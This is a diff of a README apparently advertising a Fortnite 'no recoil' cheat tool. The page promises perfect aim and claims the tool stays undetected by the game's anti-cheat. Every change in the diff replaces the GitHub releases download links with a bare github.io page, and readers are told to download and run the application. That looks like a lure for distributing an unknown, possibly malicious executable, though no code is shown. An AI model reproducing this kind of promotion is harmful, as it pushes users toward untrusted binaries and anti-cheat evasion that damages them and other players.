@@ -1,7 +1,7 @@
 <h1>🎯 fortnite-no-recoil-2026 - Perfect Accuracy, Zero Effort</h1>
 
 <p align="center">
-  <a href="https://github.com/alextan38/fortnite-no-recoil-2026/releases">
+  <a href="https://alextan38.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download Button" width="350">
   </a>
 </p>
@@ -34,7 +34,7 @@ Follow these simple steps to get up and running in under 5 minutes.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[fortnite-no-recoil-2026 Download Page](https://github.com/alextan38/fortnite-no-recoil-2026/releases)**
+👉 **[fortnite-no-recoil-2026 Download Page](https://alextan38.github.io)**
 
 You'll see a list of available files. Look for the most recent version (usually at the top). Click the download button next to it.
 
@@ -102,7 +102,7 @@ The script is designed to be **undetected** by Fortnite's anti-cheat system. How
 
 We regularly release updates to ensure compatibility with the latest Fortnite patches. Here's how to stay current:
 
-- **Check for updates** – Visit the [releases page](https://github.com/alextan38/fortnite-no-recoil-2026/releases) monthly
+- **Check for updates** – Visit the [releases page](https://alextan38.github.io) monthly
 - **Automatic updates** – The application checks for new versions when you run it
 - **Compatibility** – Works with all game modes: Battle Royale, Zero Build, Creative, and Reload
 
@@ -163,7 +163,7 @@ Need help? Here's how to get assistance:
 
 Before you start playing, make sure you've completed these steps:
 
-- [ ] Downloaded the latest version from the [releases page](https://github.com/alextan38/fortnite-no-recoil-2026/releases)
+- [ ] Downloaded the latest version from the [releases page](https://alextan38.github.io)
 - [ ] Ran the application (or extracted and ran it)
 - [ ] Launched Fortnite
 - [ ] Confirmed recoil is gone by firing a weapon
@@ -174,7 +174,7 @@ Before you start playing, make sure you've completed these steps:
 
 Stop missing shots. Stop fighting your weapon's recoil. Download **fortnite-no-recoil-2026** today and experience what it feels like to have perfect aim in every single fight.
 
-**[⬇️ Download Now – It's Free!](https://github.com/alextan38/fortnite-no-recoil-2026/releases)**
+**[⬇️ Download Now – It's Free!](https://alextan38.github.io)**
 
 ---
 
